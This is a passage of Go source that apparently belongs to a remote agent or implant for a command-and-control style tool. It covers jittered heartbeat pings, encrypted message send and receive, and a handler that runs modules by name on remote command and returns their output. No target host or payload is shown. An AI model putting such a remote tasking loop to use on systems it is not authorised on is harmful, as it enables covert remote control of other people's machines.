			case protocol.MsgPong:
				fmt.Println("[*] pong received")
			}
		}
	}()

	go func() {
		for {
			j.Wait()
			msg := protocol.Message{Type: protocol.MsgPing}
			sendMsg(ch, cryptoSes, msg)
		}
	}()

	<-sigCh
}

func sendMsg(ch channel.Channel, cryptoSes *crypto.Session, msg protocol.Message) {
	data := protocol.Marshal(msg)
	if cryptoSes != nil {
		enc, err := cryptoSes.Encrypt(data)
		if err != nil {
			return
		}
		data = enc
	}
	ch.Send(data)
}

func recvMsg(ch channel.Channel, cryptoSes *crypto.Session) *protocol.Message {
	data, err := ch.Recv()
	if err != nil {
		return nil
	}
	if cryptoSes != nil {
		dec, err := cryptoSes.Decrypt(data)
		if err != nil {
			return nil
		}
		data = dec
	}
	msg, err := protocol.Unmarshal(data)
	if err != nil {
		return nil
	}
	return &msg
}

func handleModuleExec(ch channel.Channel, cryptoSes *crypto.Session, reg *modules.Registry, msg protocol.Message) {
	parts := strings.Split(string(msg.Payload), "\x00")
	modName := parts[0]
	var modArgs []string
	if len(parts) > 1 {
		modArgs = parts[1:]
	}

	output, err := reg.Execute(modName, modArgs)
	if err != nil {
		output = []byte(fmt.Sprintf("[%s] error: %v", modName, err))
	} else {
		header := fmt.Sprintf("[%s]\n", modName)
		output = append([]byte(header), output...)
	}

	resp := protocol.Message{Type: protocol.MsgModuleResult, StreamID: msg.StreamID, Payload: output}
	sendMsg(ch, cryptoSes, resp)
}
